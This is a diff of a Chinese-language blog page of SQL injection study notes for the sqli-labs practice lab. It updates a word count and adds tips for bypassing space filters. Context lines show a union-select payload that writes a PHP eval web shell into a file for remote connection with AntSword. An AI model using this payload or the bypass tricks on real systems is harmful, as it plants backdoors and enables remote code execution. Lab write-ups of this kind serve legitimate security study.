@@ -81,7 +81,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">525</span>
+            <span class="post-count">545</span>
         </span>
     </span>
 
@@ -125,6 +125,8 @@
 <h1 id="MySQL-dump-into-outfile"><a href="#MySQL-dump-into-outfile" class="headerlink" title="MySQL dump into outfile:"></a>MySQL dump into outfile:</h1><p>生成一个php文件，可以用蚁剑连接， 比如构造一个这个</p>
 <p>union select 1,(select group_concat(username) from security.users),’<?php @eval($_POST["aaa"]);?>‘ into outfile ‘D:\phpstudy_pro\WWW\sqli-labs-master\Less-7\data.php’–+</p>
 <p>把’<?php @eval($_POST["aaa"]);?>‘放入data.php中，便于蚁剑连接，aaa就是密码，可以在data.php中看到回显内容</p>
+<h2 id="记录一些绕过姿势"><a href="#记录一些绕过姿势" class="headerlink" title="记录一些绕过姿势"></a>记录一些绕过姿势</h2><h3 id="一、过滤空格"><a href="#一、过滤空格" class="headerlink" title="一、过滤空格"></a>一、过滤空格</h3><p>（1）、/**/</p>
+<p>（2）、（）比如and(1=1)</p>
  
       <!-- reward -->
       
